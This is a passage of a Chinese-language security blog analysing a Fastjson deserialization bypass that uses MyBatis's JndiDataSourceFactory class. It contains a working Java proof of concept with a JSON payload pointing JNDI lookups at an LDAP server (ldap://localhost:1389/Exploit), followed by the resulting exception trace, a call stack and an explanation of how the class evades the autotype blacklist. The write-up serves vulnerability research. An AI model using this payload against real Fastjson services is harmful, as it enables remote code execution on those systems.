<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">ParserConfig</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JdbcRowSetImplPoc</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> argv<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token class-name">ParserConfig</span><span class="token punctuation">.</span><span class="token function">getGlobalInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAutoTypeSupport</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token string">&quot;{\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,\&quot;properties\&quot;:{\&quot;data_source\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;}}\n&quot;</span><span class="token punctuation">;</span>

        <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>实测，目前最新版的 mybatis 3.5.16 也可以触发。</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240419172550-h4ad2ii.ac57e049.png" alt="image" loading="lazy">​</p><p>异常信息</p><div class="language-xml line-numbers-mode" data-ext="xml" data-title="xml"><pre class="language-xml"><code>Exception in thread &quot;main&quot; org.apache.ibatis.datasource.DataSourceException: There was an error configuring JndiDataSourceTransactionPool. Cause: javax.naming.NamingException: problem generating object using object factory [Root exception is java.lang.ClassCastException: EXP.Exploit cannot be cast to javax.naming.spi.ObjectFactory]; remaining name &#39;Exploit&#39;
	at org.apache.ibatis.datasource.jndi.JndiDataSourceFactory.setProperties(JndiDataSourceFactory.java:42)
	at com.alibaba.fastjson.parser.deserializer.FastjsonASMDeserializer_1_JndiDataSourceFactory.deserialze(Unknown Source)
	at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:267)
	at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:384)
	at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1356)
	at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1322)
	at com.alibaba.fastjson.JSON.parse(JSON.java:152)
	at com.alibaba.fastjson.JSON.parse(JSON.java:162)
	at com.alibaba.fastjson.JSON.parse(JSON.java:131)
	at demo.JdbcRowSetImplPoc.main(JdbcRowSetImplPoc.java:14)
Caused by: javax.naming.NamingException: problem generating object using object factory [Root exception is java.lang.ClassCastException: EXP.Exploit cannot be cast to javax.naming.spi.ObjectFactory]; remaining name &#39;Exploit&#39;
	at com.sun.jndi.ldap.LdapCtx.c_lookup(LdapCtx.java:1092)
	at com.sun.jndi.toolkit.ctx.ComponentContext.p_lookup(ComponentContext.java:542)
	at com.sun.jndi.toolkit.ctx.PartialCompositeContext.lookup(PartialCompositeContext.java:177)
	at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)
	at com.sun.jndi.url.ldap.ldapURLContext.lookup(ldapURLContext.java:94)
	at javax.naming.InitialContext.lookup(InitialContext.java:417)
	at org.apache.ibatis.datasource.jndi.JndiDataSourceFactory.setProperties(JndiDataSourceFactory.java:38)
	... 9 more
Caused by: java.lang.ClassCastException: EXP.Exploit cannot be cast to javax.naming.spi.ObjectFactory
	at javax.naming.spi.NamingManager.getObjectFactoryFromReference(NamingManager.java:163)
	at javax.naming.spi.DirectoryManager.getObjectInstance(DirectoryManager.java:189)
	at com.sun.jndi.ldap.LdapCtx.c_lookup(LdapCtx.java:1085)
	... 15 more
Picked up JAVA_TOOL_OPTIONS: -Dfile.encoding=UTF-8

Process finished with exit code 1

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="利用链分析" tabindex="-1"><a class="header-anchor" href="#利用链分析"><span>利用链分析</span></a></h3><p>由于 &quot;<code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code>​&quot; 不在黑名单中，因此能成功绕过 <code>checkAutoType()</code>​ 函数的检测，继续往下调试分析这条利用链的原理。</p><p>由于 payload 中设置了 <code>properties</code>​ 属性值，且 <code>JndiDataSourceFactory.setProperties()</code>​ 方法满足之前说的 Fastjson 会自动调用的 setter 方法的条件，因此可被利用来进行 Fastjson 反序列化漏洞的利用。</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240419174259-dh29efj.37af4173.png" alt="image" loading="lazy">​</p><p>通过 fastjson 设置 <code>public static final String DATA_SOURCE = &quot;data_source&quot;;</code>​ 后，就相当于 <code>DATA_SOURCE</code>​ 可控，之后就是由 JNDI 注入的流程了。</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token comment">// 调用栈</span>
<span class="token generics"><span class="token punctuation">&lt;</span>init<span class="token punctuation">&gt;</span></span><span class="token operator">:</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token class-name">Exploit</span>
newInstance0<span class="token operator">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token class-name">NativeConstructorAccessorImpl</span> <span class="token punctuation">(</span>sun<span class="token punctuation">.</span>reflect<span class="token punctuation">)</span>
newInstance<span class="token operator">:</span><span class="token number">57</span><span class="token punctuation">,</span> <span class="token class-name">NativeConstructorAccessorImpl</span> <span class="token punctuation">(</span>sun<span class="token punctuation">.</span>reflect<span class="token punctuation">)</span>
newInstance<span class="token operator">:</span><span class="token number">45</span><span class="token punctuation">,</span> <span class="token class-name">DelegatingConstructorAccessorImpl</span> <span class="token punctuation">(</span>sun<span class="token punctuation">.</span>reflect<span class="token punctuation">)</span>
newInstance<span class="token operator">:</span><span class="token number">526</span><span class="token punctuation">,</span> <span class="token class-name">Constructor</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">)</span>
newInstance<span class="token operator">:</span><span class="token number">383</span><span class="token punctuation">,</span> <span class="token class-name">Class</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>lang<span class="token punctuation">)</span>
getObjectFactoryFromReference<span class="token operator">:</span><span class="token number">163</span><span class="token punctuation">,</span> <span class="token class-name">NamingManager</span> <span class="token punctuation">(</span>javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>spi<span class="token punctuation">)</span>
getObjectInstance<span class="token operator">:</span><span class="token number">188</span><span class="token punctuation">,</span> <span class="token class-name">DirectoryManager</span> <span class="token punctuation">(</span>javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>spi<span class="token punctuation">)</span>
c_lookup<span class="token operator">:</span><span class="token number">1086</span><span class="token punctuation">,</span> <span class="token class-name">LdapCtx</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>ldap<span class="token punctuation">)</span>
p_lookup<span class="token operator">:</span><span class="token number">544</span><span class="token punctuation">,</span> <span class="token class-name">ComponentContext</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>toolkit<span class="token punctuation">.</span>ctx<span class="token punctuation">)</span>
lookup<span class="token operator">:</span><span class="token number">177</span><span class="token punctuation">,</span> <span class="token class-name">PartialCompositeContext</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>toolkit<span class="token punctuation">.</span>ctx<span class="token punctuation">)</span>
lookup<span class="token operator">:</span><span class="token number">203</span><span class="token punctuation">,</span> <span class="token class-name">GenericURLContext</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>toolkit<span class="token punctuation">.</span>url<span class="token punctuation">)</span>
lookup<span class="token operator">:</span><span class="token number">94</span><span class="token punctuation">,</span> ldapURLContext <span class="token punctuation">(</span>com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>url<span class="token punctuation">.</span>ldap<span class="token punctuation">)</span>
lookup<span class="token operator">:</span><span class="token number">411</span><span class="token punctuation">,</span> <span class="token class-name">InitialContext</span> <span class="token punctuation">(</span>javax<span class="token punctuation">.</span>naming<span class="token punctuation">)</span>
setProperties<span class="token operator">:</span><span class="token number">56</span><span class="token punctuation">,</span> <span class="token class-name">JndiDataSourceFactory</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>ibatis<span class="token punctuation">.</span>datasource<span class="token punctuation">.</span>jndi<span class="token punctuation">)</span>
deserialze<span class="token operator">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token class-name">FastjsonASMDeserializer_1_JndiDataSourceFactory</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span>deserializer<span class="token punctuation">)</span>
deserialze<span class="token operator">:</span><span class="token number">267</span><span class="token punctuation">,</span> <span class="token class-name">JavaBeanDeserializer</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span>deserializer<span class="token punctuation">)</span>
parseObject<span class="token operator">:</span><span class="token number">384</span><span class="token punctuation">,</span> <span class="token class-name">DefaultJSONParser</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">)</span>
parse<span class="token operator">:</span><span class="token number">1356</span><span class="token punctuation">,</span> <span class="token class-name">DefaultJSONParser</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">)</span>
parse<span class="token operator">:</span><span class="token number">1322</span><span class="token punctuation">,</span> <span class="token class-name">DefaultJSONParser</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">)</span>
parse<span class="token operator">:</span><span class="token number">152</span><span class="token punctuation">,</span> <span class="token constant">JSON</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">)</span>
parse<span class="token operator">:</span><span class="token number">162</span><span class="token punctuation">,</span> <span class="token constant">JSON</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">)</span>
parse<span class="token operator">:</span><span class="token number">131</span><span class="token punctuation">,</span> <span class="token constant">JSON</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">)</span>
main<span class="token operator">:</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token class-name">JdbcRowSetImplPoc</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="总结" tabindex="-1"><a class="header-anchor" href="#总结"><span>总结</span></a></h2><p>Fastjson 开启 AutoTypeSupport 的历史版本补丁的绕过大致就这些，后面就是讲 2019 年 Fastjson 反序列化漏洞，一样是 <code>checkAutoType()</code>​ 的绕过，但是无需开启 AutoTypeSupport。</p><h2 id="前人栽树" tabindex="-1"><a class="header-anchor" href="#前人栽树"><span>前人栽树</span></a></h2><ul><li><a href="https://www.mi1k7ea.com/2019/11/10/Fastjson%E7%B3%BB%E5%88%97%E4%B8%89%E2%80%94%E2%80%94%E5%8E%86%E5%8F%B2%E7%89%88%E6%9C%AC%E8%A1%A5%E4%B8%81%E7%BB%95%E8%BF%87%EF%BC%88%E9%9C%80%E5%BC%80%E5%90%AFAutoType%EF%BC%89/" target="_blank" rel="noopener noreferrer">Fastjson 系列三——历史版本补丁绕过（需开启 AutoType） [ Mi1k7ea ]<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li></ul></div><!--[--><!----><!--]--><footer class="vp-page-meta"><div class="vp-meta-item edit-link"><a href="https://github.com/zha0cai/edit/main/src/codereview/【JavaSec】漏洞分析/fastjson 反序列化 (Ⅱ).md" rel="noopener noreferrer" target="_blank" aria-label="在 GitHub 上编辑此页" class="nav-link vp-meta-label"><!--[--><svg xmlns="http://www.w3.org/2000/svg" class="icon edit-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="edit icon"><path d="M430.818 653.65a60.46 60.46 0 0 1-50.96-93.281l71.69-114.012 7.773-10.365L816.038 80.138A60.46 60.46 0 0 1 859.225 62a60.46 60.46 0 0 1 43.186 18.138l43.186 43.186a60.46 60.46 0 0 1 0 86.373L588.879 565.55l-8.637 8.637-117.466 68.234a60.46 60.46 0 0 1-31.958 11.229z"></path><path d="M728.802 962H252.891A190.883 190.883 0 0 1 62.008 771.98V296.934a190.883 190.883 0 0 1 190.883-192.61h267.754a60.46 60.46 0 0 1 0 120.92H252.891a69.962 69.962 0 0 0-69.098 69.099V771.98a69.962 69.962 0 0 0 69.098 69.098h475.911A69.962 69.962 0 0 0 797.9 771.98V503.363a60.46 60.46 0 1 1 120.922 0V771.98A190.883 190.883 0 0 1 728.802 962z"></path></svg><!--]-->在 GitHub 上编辑此页<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span><!----></a></div><div class="vp-meta-item git-info"><!----><!----></div></footer><!----><div id="vp-comment" class="giscus-wrapper input-top" style="display:block;"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" preserveAspectRatio="xMidYMid" viewBox="0 0 100 100"><circle cx="28" cy="75" r="11" fill="currentColor"><animate attributeName="fill-opacity" begin="0s" dur="1s" keyTimes="0;0.2;1" repeatCount="indefinite" values="0;1;1"></animate></circle><path fill="none" stroke="#88baf0" stroke-width="10" d="M28 47a28 28 0 0 1 28 28"><animate attributeName="stroke-opacity" begin="0.1s" dur="1s" keyTimes="0;0.2;1" repeatCount="indefinite" values="0;1;1"></animate></path><path fill="none" stroke="#88baf0" stroke-width="10" d="M28 25a50 50 0 0 1 50 50"><animate attributeName="stroke-opacity" begin="0.2s" dur="1s" keyTimes="0;0.2;1" repeatCount="indefinite" values="0;1;1"></animate></path></svg></div><!--[--><!----><!--]--><!--]--></main><!--]--><footer class="vp-footer-wrapper"><div class="vp-footer">Create by zha0cai</div><div class="vp-copyright">Copyright © 2024 Mr.zha0cai </div></footer></div><!--]--><!--[--><!----><!--]--><!--]--></div>
    <script src="/SecWikiPublic/secwiki/assets/js/runtime~app.e52a4695.js" defer></script><script src="/SecWikiPublic/secwiki/assets/js/335.d146fa33.js" defer></script><script src="/SecWikiPublic/secwiki/assets/js/app.e30d6887.js" defer></script>
  </body>
</html>
